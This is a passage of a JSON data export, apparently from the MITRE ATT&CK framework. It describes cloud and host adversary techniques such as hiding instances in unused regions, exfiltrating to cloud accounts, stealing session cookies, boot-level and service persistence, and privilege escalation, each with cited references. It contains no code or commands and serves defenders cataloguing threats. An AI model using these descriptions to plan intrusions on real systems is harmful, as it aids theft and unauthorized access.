    "technique_description": "<p>Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.<!-- raw HTML omitted --><!-- raw HTML omitted -->Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.<!-- raw HTML omitted --><!-- raw HTML omitted -->A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.(Citation: AWS Region Service Table)<!-- raw HTML omitted --><!-- raw HTML omitted -->An example of adversary use of unused AWS regions is to mine cryptocurrency through <a href=\"https://attack.mitre.org/techniques/T1496\">Resource Hijacking</a>, which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)</p>\n",
    "technique_references": [
      {
        "source_name": "AWS Region Service Table",
        "url": "https://aws.amazon.com/about-aws/global-infrastructure/regional-product-services/",
        "description": "Amazon. (2019, October 22). Region Table. Retrieved October 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CloudSploit - Unused AWS Regions",
        "url": "https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc",
        "description": "CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d4bdbdea-eaec-4071-b4f9-5105e12ea4b6",
    "platform": "azure|aws|gcp",
    "tid": "T1537",
    "technique": "Transfer Data to Cloud Account",
    "tactic": "exfiltration",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.<!-- raw HTML omitted --><!-- raw HTML omitted -->A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.<!-- raw HTML omitted --><!-- raw HTML omitted -->Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "DOJ GRU Indictment Jul 2018",
        "url": "https://www.justice.gov/file/1080281/download",
        "description": "Mueller, R. (2018, July 13). Indictment - United States of America vs. VIKTOR BORISOVICH NETYKSHO, et al. Retrieved September 13, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
    "platform": "aws|gcp|azure|azure-ad|office-365",
    "tid": "T1538",
    "technique": "Cloud Service Dashboard",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|office-365-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)<!-- raw HTML omitted --><!-- raw HTML omitted -->Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.</p>\n",
    "technique_references": [
      {
        "source_name": "Google Command Center Dashboard",
        "url": "https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard",
        "description": "Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "AWS Console Sign-in Events",
        "url": "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html",
        "description": "Amazon. (n.d.). AWS Console Sign-in Events. Retrieved October 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
    "platform": "linux|macos|windows|office-365|saas",
    "tid": "T1539",
    "technique": "Steal Web Session Cookie",
    "tactic": "credential-access",
    "datasources": "api-monitoring|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.<!-- raw HTML omitted --><!-- raw HTML omitted -->Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)<!-- raw HTML omitted --><!-- raw HTML omitted -->There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)<!-- raw HTML omitted --><!-- raw HTML omitted -->After an adversary acquires a valid cookie, they can then perform a <a href=\"https://attack.mitre.org/techniques/T1506\">Web Session Cookie</a> technique to login to the corresponding web application.</p>\n",
    "technique_references": [
      {
        "source_name": "Pass The Cookie",
        "url": "https://wunderwuzzi23.github.io/blog/passthecookie.html",
        "description": "Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky TajMahal April 2019",
        "url": "https://securelist.com/project-tajmahal/90240/",
        "description": "GReAT. (2019, April 10). Project TajMahal – a sophisticated new APT framework. Retrieved October 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Mac Crypto Cookies January 2019",
        "url": "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
        "description": "Chen, Y., Hu, W., Xu, Z., et. al.. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Github evilginx2",
        "url": "https://github.com/kgretzky/evilginx2",
        "description": "Gretzky, Kuba. (2019, April 10). Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Mauraena",
        "url": "https://github.com/muraenateam/muraena",
        "description": "Orrù, M., Trotta, G.. (2019, September 11). Muraena. Retrieved October 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e",
    "platform": "linux|windows|network",
    "tid": "T1542",
    "technique": "Pre-OS Boot",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|bios|component-firmware|disk-forensics|efi|mbr|process-monitoring|vbr",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1542.001",
      "T1542.002",
      "T1542.003",
      "T1542.004",
      "T1542.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Booting",
        "url": "https://en.wikipedia.org/wiki/Booting",
        "description": "Wikipedia. (n.d.). Booting. Retrieved November 13, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ITWorld Hard Disk Health Dec 2014",
        "url": "https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html",
        "description": "Pinola, M. (2014, December 14). 3 tools to check your hard drive's health and make sure it's not already dying on you. Retrieved October 2, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7f0ca133-88c4-40c6-a62f-b3083a7fbc2e",
    "platform": "linux|windows|network",
    "tid": "T1542",
    "technique": "Pre-OS Boot",
    "tactic": "persistence",
    "datasources": "api-monitoring|bios|component-firmware|disk-forensics|efi|mbr|process-monitoring|vbr",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1542.001",
      "T1542.002",
      "T1542.003",
      "T1542.004",
      "T1542.005"
    ],
    "count_subtechniques": 5,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.</p>\n",
    "technique_references": [
      {
        "source_name": "Wikipedia Booting",
        "url": "https://en.wikipedia.org/wiki/Booting",
        "description": "Wikipedia. (n.d.). Booting. Retrieved November 13, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ITWorld Hard Disk Health Dec 2014",
        "url": "https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html",
        "description": "Pinola, M. (2014, December 14). 3 tools to check your hard drive's health and make sure it's not already dying on you. Retrieved October 2, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
    "platform": "windows|macos|linux",
    "tid": "T1543",
    "technique": "Create or Modify System Process",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1543.001",
      "T1543.002",
      "T1543.003",
      "T1543.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> and <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a> are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Services",
        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
    "platform": "windows|macos|linux",
    "tid": "T1543",
    "technique": "Create or Modify System Process",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1543.001",
      "T1543.002",
      "T1543.003",
      "T1543.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> and <a href=\"https://attack.mitre.org/techniques/T1543/001\">Launch Agent</a> are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).</p>\n",
    "technique_references": [
      {
        "source_name": "TechNet Services",
        "url": "https://technet.microsoft.com/en-us/library/cc772408.aspx",
        "description": "Microsoft. (n.d.). Services. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "OSX Malware Detection",
        "url": "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
        "description": "Patrick Wardle. (2016, February 29). Let's Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
    "platform": "linux|macos|windows",
    "tid": "T1546",
    "technique": "Event Triggered Execution",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|process-use-of-network|system-calls|windows-event-logs|windows-registry|wmi-objects",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1546.001",
      "T1546.002",
      "T1546.003",
      "T1546.004",
      "T1546.005",
      "T1546.006",
      "T1546.007",
      "T1546.008",
      "T1546.009",
      "T1546.010",
      "T1546.011",
      "T1546.012",
      "T1546.013",
      "T1546.014",
      "T1546.015"
    ],
    "count_subtechniques": 15,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)<!-- raw HTML omitted --><!-- raw HTML omitted -->Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "amnesia malware",
        "url": "https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/",
        "description": "Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
    "platform": "linux|macos|windows",
    "tid": "T1546",
    "technique": "Event Triggered Execution",
    "tactic": "persistence",
    "datasources": "api-monitoring|binary-file-metadata|dll-monitoring|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|process-use-of-network|system-calls|windows-event-logs|windows-registry|wmi-objects",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1546.001",
      "T1546.002",
      "T1546.003",
      "T1546.004",
      "T1546.005",
      "T1546.006",
      "T1546.007",
      "T1546.008",
      "T1546.009",
      "T1546.010",
      "T1546.011",
      "T1546.012",
      "T1546.013",
      "T1546.014",
      "T1546.015"
    ],
    "count_subtechniques": 15,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)<!-- raw HTML omitted --><!-- raw HTML omitted -->Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye WMI 2015",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf",
        "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Persistence on OS X",
        "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
        "description": "Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "amnesia malware",
        "url": "https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/",
        "description": "Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
    "platform": "linux|macos|windows",
    "tid": "T1547",
    "technique": "Boot or Logon Autostart Execution",
    "tactic": "persistence",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1547.001",
      "T1547.002",
      "T1547.003",
      "T1547.004",
      "T1547.005",
      "T1547.006",
      "T1547.007",
      "T1547.008",
      "T1547.009",
      "T1547.010",
      "T1547.011",
      "T1547.012"
    ],
    "count_subtechniques": 12,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.<!-- raw HTML omitted --><!-- raw HTML omitted -->Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/564.html",
        "description": "none",
        "external_id": "CAPEC-564"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
    "platform": "linux|macos|windows",
    "tid": "T1547",
    "technique": "Boot or Logon Autostart Execution",
    "tactic": "privilege-escalation",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1547.001",
      "T1547.002",
      "T1547.003",
      "T1547.004",
      "T1547.005",
      "T1547.006",
      "T1547.007",
      "T1547.008",
      "T1547.009",
      "T1547.010",
      "T1547.011",
      "T1547.012"
    ],
    "count_subtechniques": 12,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming)  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.<!-- raw HTML omitted --><!-- raw HTML omitted -->Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/564.html",
        "description": "none",
        "external_id": "CAPEC-564"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft TimeProvider",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
        "description": "Microsoft. (n.d.). Time Provider. Retrieved March 26, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Cylance Reg Persistence Sept 2013",
        "url": "https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order",
        "description": "Langendorf, S. (2013, September 24). Windows Registry Persistence, Part 2: The Run Keys and Search-Order. Retrieved April 11, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Linux Kernel Programming",
        "url": "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
        "description": "Pomerantz, O., Salzman, P.. (2003, April 4). The Linux Kernel Module Programming Guide. Retrieved April 6, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b",
    "platform": "linux|macos|windows",
    "tid": "T1548",
    "technique": "Abuse Elevation Control Mechanism",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1548.001",
      "T1548.002",
      "T1548.003",
      "T1548.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b",
    "platform": "linux|macos|windows",
    "tid": "T1548",
    "technique": "Abuse Elevation Control Mechanism",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1548.001",
      "T1548.002",
      "T1548.003",
      "T1548.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
    "platform": "windows|office-365|saas",
    "tid": "T1550",
    "technique": "Use Alternate Authentication Material",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|oauth-audit-logs|office-365-audit-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1550.001",
      "T1550.002",
      "T1550.003",
      "T1550.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. <!-- raw HTML omitted --><!-- raw HTML omitted -->Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)<!-- raw HTML omitted --><!-- raw HTML omitted -->Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through <a href=\"https://attack.mitre.org/tactics/TA0006\">Credential Access</a> techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.<!-- raw HTML 